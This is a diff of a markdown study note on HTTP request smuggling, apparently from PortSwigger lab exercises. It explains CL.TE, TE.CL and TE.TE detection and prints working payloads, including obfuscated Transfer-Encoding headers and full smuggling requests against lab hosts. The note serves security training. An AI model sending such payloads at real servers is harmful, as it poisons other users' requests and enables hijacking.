@@ -47,7 +47,7 @@ Prepare burp for request smuggling
 ## Global detection 
 
 
-![detect_HTTP_smuggling_request](detect_http.png)
+![detect_HTTP_smuggling_request](img/detect_http.png)
 
 
 ## DETECT CL.TE vulnerability
@@ -70,7 +70,7 @@ We set the content length to 6, to tell the front and that if it's using CL, tha
 
 it' because that the front end won't be sending `X\r\n`, and looks at the chunked size equals to 3, and it'll be still waiting for the next chunked to come before the timeout.
 
-![CL.TE](CL.TE.png)
+![CL.TE](img/CL.TE.png)
 
 
 ## Detect TE.CL vulnerability
@@ -93,11 +93,11 @@ regarding the backend, we throw this payload
 
 and we should receive a timeout, it's because the front end is using TE and it'll send only `0\r\n \r\n` and since the server is using CL (hypothesis) it will read the content-length of 6 and will receive only 5, and i'll wait for the end until a time-out.
 
-![TE.CL](TE.CL_discovery.png)
+![TE.CL](./img/TE.CL_discovery.png)
 
 ## TE.CL attack
 
-![TE.CL](TE.CL-attack.png)
+![TE.CL](./img/TE.CL-attack.png)
 // didn't understand it a 100%
 
 BUT : since the front end is using TE, we will use it to poison the backend server with the content length so just `1\r\n` will be processed, and the rest will be on hold, and it will be appended as a prefix to the next request to the backend.
@@ -165,7 +165,7 @@ for the back end we use this payload :
     X\r\n
  we'll get back a 200 ok, since the payload is valid, since X is dropped  the back end receives a valid value, if he was using a CL, it will be waiting for the rest of the request.
 
-![TE.TE](TE.TE1.png)
+![TE.TE](./img/TE.TE1.png)
 
 how to perform the attack, we need to obfuscate the TE chunked and doesn't use it, instead use CL, these are potential payloads : 
 
@@ -185,9 +185,9 @@ how to perform the attack, we need to obfuscate the TE chunked and doesn't use i
     Transfer-Encoding
     : chunked
 
-![image](obfuscate.png)
+![image](./img/obfuscate.png)
 
-To sole the lab this is the used payload : 
+To solve the lab this is the used payload : 
 
     POST / HTTP/1.1
     Host: 0aa1001a03ee37b8800e6c2f008f0068.web-security-academy.net
@@ -205,4 +205,35 @@ To sole the lab this is the used payload :
     \r\n
  and then send normal request
 
-![image](solutionTETE.png)
+![image](./img/solutionTETE.png)
+
+# Confirming CL.TE vulnerabilities using differential responses
+
+the image sums it up : 
+
+![image](./img/CL.TE.DIFF.png)
+
+We will send the request with the normal content length with the payload poisoning `GET /path` and adding `X-Ignore : X` without `\r\n` so that when we send a normal request the `Xget` will be ignored, and the HOST and other stuff will be taken into account.
+also do not forget `0\r\n\r\n` in order to tell the back end that request ends, and poison with the next request.
+
+to solve the lab this is the payload i used : 
+    POST / HTTP/1.1
+    Host: 0ae8001803718feb818975b600c900da.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 35
+    Transfer-Encoding: chunked
+    \r\n
+    0\r\n
+    \r\n
+    GET /404 HTTP/1.1
+    X-Ignore: x
+
+and the normal request :
+    POST / HTTP/1.1
+    Host: 0ae8001803718feb818975b600c900da.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 11
+
+    foo=bar
+
+Recap : the front uses CL, so we send all the request, the back uses TE so we tell him to end the request at `0\r\n\r\n` so the next `GET` will be on hold to prefix the next request. 
